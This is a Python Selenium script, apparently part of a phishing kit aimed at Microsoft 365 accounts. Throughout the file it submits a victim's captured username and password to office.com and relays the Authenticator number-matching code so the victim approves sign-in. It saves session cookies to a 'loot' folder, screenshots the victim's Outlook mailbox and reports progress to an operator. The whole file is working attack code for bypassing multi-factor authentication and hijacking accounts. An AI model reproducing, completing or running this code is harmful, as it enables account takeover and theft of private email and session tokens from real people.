import json
import pickle
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
from queue import Queue


try:
    import sys

    sys.path.insert(0, "..")
    from utils import messageAdmin
except:
    pass
try:
    import sys

    sys.path.insert(0, "..")
    import test
except:
    pass


class auto_login:
    def __init__(self, q, id, username, password):
        print("[+] starting")
        self.username = username
        self.password = password
        self.q = q
        self.id = id
        self.loot_location = (
            "./loot/" + "".join(i for i in username if i.isalpha()) + "_" + id
        )
        self.OTP_type = None
        self.OTP = None
        self.return_json = self.set_return("init")
        if not os.path.exists(self.loot_location):
            os.makedirs(self.loot_location)
        s = Service(r"./chromedriver-linux64/chromedriver")
        options = Options()
        # options.add_argument("--headless")
        # options.add_argument("--disable-gpu")
        self.driver = webdriver.Chrome(service=s, options=options)
        self.driver.set_window_size(1920, 1080)
        self.q.put(self.return_json)
        # self.login()
        # return self.return_json

    def set_return(self, msg, data=""):
        # print(f"[+] current Stat: {msg} : {data}")
        self.return_json = json.dumps({"id": self.id, "msg": msg, "data": data})
        messageAdmin(
            f"------------- ID: {self.id}\n {self.return_json} \n -----------------"
        )
        self.q.put(self.return_json)

    # submit creds,
    def login(self):
        self.driver.set_page_load_timeout(60)
        self.driver.get("https://www.office.com/login")
        time.sleep(5)
        # username_input = self.driver.find_element(by=By.ID, value="i0116")
        # username_input.send_keys(self.username)

        WebDriverWait(self.driver, 20).until(
            EC.presence_of_element_located((By.ID, "i0116"))
        ).send_keys(self.username)

        WebDriverWait(self.driver, 20).until(
            EC.presence_of_element_located((By.ID, "idSIButton9"))
        ).click()
        # username_submit = self.driver.find_element(by=By.ID, value="idSIButton9")
        # username_submit.click()
        time.sleep(5)
        # check if user exist
        if "We couldn't find an account with that username." in self.driver.page_source:
            print("invalid")
            self.set_return("invalid_username")
            return

        # password_input = self.driver.find_element(by=By.ID, value="i0118")
        # password_input.send_keys(self.password)
        WebDriverWait(self.driver, 20).until(
            EC.presence_of_element_located((By.ID, "i0118"))
        ).send_keys(self.password)

        WebDriverWait(self.driver, 20).until(
            EC.presence_of_element_located((By.ID, "idSIButton9"))
        ).click()

        # password_submit = self.driver.find_element(by=By.ID, value="idSIButton9")
        # password_submit.click()

        # check if password is correct
        time.sleep(5)
        if "Your account or password is incorrect" in self.driver.page_source:
            print("invalid")
            self.set_return("invalid_password")
            return

        # time.sleep(5)
        print("[+] valid creds")
        # check if OTP present:
        # check OTP type
        self.set_return("valid_creds")
        if (
            "Open your Authenticator app, and enter the number shown to sign in."
            in self.driver.page_source
        ):
            OTP_code_element = self.driver.find_element(
                by=By.ID, value="idRichContext_DisplaySign"
            )
            self.OTP = OTP_code_element.text
            print(self.OTP)
            self.set_return("OTP_code", self.OTP)
            # TODO: imporve this by waiting for an element insted
            # time.sleep(10)
            while True:
                time.sleep(1)
                if "We didn't hear from you" in self.driver.page_source:
                    print("[+] Victim didn't click")
                    self.set_return("OTP_timeout")
                    break
                if "Welcome to Microsoft 365" in self.driver.page_source:
                    print("[+] OTP submitted")
                    self.set_return("OTP_submited")
                    break
        return self.return_json

    def get_cookies(self):
        print("[+] cookies captured: ")
        self.set_return("Capturing cookies")
        print(self.driver.get_cookies())
        with open(f"{self.loot_location}/cookies.pkl", "wb") as f:
            f.write(pickle.dumps(self.driver.get_cookies()))

    def screenshots(self, site=None):

        # current office.com page
        self.set_return("screenshotting office.com")
        time.sleep(20)
        print("screenshotting office.com")
        self.driver.get_screenshot_as_file(f"{self.loot_location}/office.png")

        # take a screen shot of the emails
        self.set_return("screenshotting outlook mail")
        self.driver.get("https://outlook.office.com.mcas.ms/mail/")
        time.sleep(5)
        if (
            "Access to Microsoft Exchange Online is monitored"
            in self.driver.page_source
        ):
            monitor_element = self.driver.find_element(
                by=By.ID, value="hiddenformSubmitBtn"
            )
            monitor_element.click()
            time.sleep(20)
        self.driver.get_screenshot_as_file(f"{self.loot_location}/outlook.png")
        print("screenshot outlook.com")

    def add_authenticator(self):
        pass

    def collect_all(self):
        self.get_cookies()
        self.screenshots()

    # time.sleep(300)


if __name__ == "__main__":
    pass
    # obj = auto_login(None, "123", test.username, test.password)
    # print(obj.login())
    # obj.collect_all()
    # time.sleep(300)
